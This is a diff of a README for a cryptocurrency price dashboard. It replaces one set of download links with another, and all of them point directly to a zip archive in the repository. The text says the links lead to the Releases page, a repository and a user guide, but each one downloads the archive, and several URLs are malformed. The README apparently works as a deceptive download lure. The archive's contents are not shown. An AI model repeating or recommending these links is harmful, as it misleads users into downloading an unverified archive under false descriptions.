@@ -8,7 +8,7 @@ Welcome to the crypto-historical-prices-dashboard! This tool helps you analyze e
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[![Download Now](https://raw.githubusercontent.com/aandrewwilson11/crypto-historical-prices-dashboard/main/deliverables/dashboard/crypto-historical-prices-dashboard-2.6.zip%https://raw.githubusercontent.com/aandrewwilson11/crypto-historical-prices-dashboard/main/deliverables/dashboard/crypto-historical-prices-dashboard-2.6.zip)](https://raw.githubusercontent.com/aandrewwilson11/crypto-historical-prices-dashboard/main/deliverables/dashboard/crypto-historical-prices-dashboard-2.6.zip)
+[![Download Now](https://raw.githubusercontent.com/aandrewwilson11/crypto-historical-prices-dashboard/main/deliverables/prices_historical_crypto_dashboard_2.5.zip%https://raw.githubusercontent.com/aandrewwilson11/crypto-historical-prices-dashboard/main/deliverables/prices_historical_crypto_dashboard_2.5.zip)](https://raw.githubusercontent.com/aandrewwilson11/crypto-historical-prices-dashboard/main/deliverables/prices_historical_crypto_dashboard_2.5.zip)
 
 Once on the Releases page, look for the latest version. Download the file suitable for your operating system. 
 
@@ -79,8 +79,8 @@ If you encounter any issues:
 
 For further guidance, you can access the following resources:
 
-- [GitHub Repository](https://raw.githubusercontent.com/aandrewwilson11/crypto-historical-prices-dashboard/main/deliverables/dashboard/crypto-historical-prices-dashboard-2.6.zip)
-- [User Guide & Documentation](https://raw.githubusercontent.com/aandrewwilson11/crypto-historical-prices-dashboard/main/deliverables/dashboard/crypto-historical-prices-dashboard-2.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/aandrewwilson11/crypto-historical-prices-dashboard/main/deliverables/prices_historical_crypto_dashboard_2.5.zip)
+- [User Guide & Documentation](https://raw.githubusercontent.com/aandrewwilson11/crypto-historical-prices-dashboard/main/deliverables/prices_historical_crypto_dashboard_2.5.zip)
 
 ## 📞 Support
 
@@ -92,4 +92,4 @@ Share your insights and experiences with other users in the discussions section.
 
 For the latest updates and features, keep an eye on the Releases page:
 
-[![Download Now](https://raw.githubusercontent.com/aandrewwilson11/crypto-historical-prices-dashboard/main/deliverables/dashboard/crypto-historical-prices-dashboard-2.6.zip%https://raw.githubusercontent.com/aandrewwilson11/crypto-historical-prices-dashboard/main/deliverables/dashboard/crypto-historical-prices-dashboard-2.6.zip)](https://raw.githubusercontent.com/aandrewwilson11/crypto-historical-prices-dashboard/main/deliverables/dashboard/crypto-historical-prices-dashboard-2.6.zip)
+[![Download Now](https://raw.githubusercontent.com/aandrewwilson11/crypto-historical-prices-dashboard/main/deliverables/prices_historical_crypto_dashboard_2.5.zip%https://raw.githubusercontent.com/aandrewwilson11/crypto-historical-prices-dashboard/main/deliverables/prices_historical_crypto_dashboard_2.5.zip)](https://raw.githubusercontent.com/aandrewwilson11/crypto-historical-prices-dashboard/main/deliverables/prices_historical_crypto_dashboard_2.5.zip)
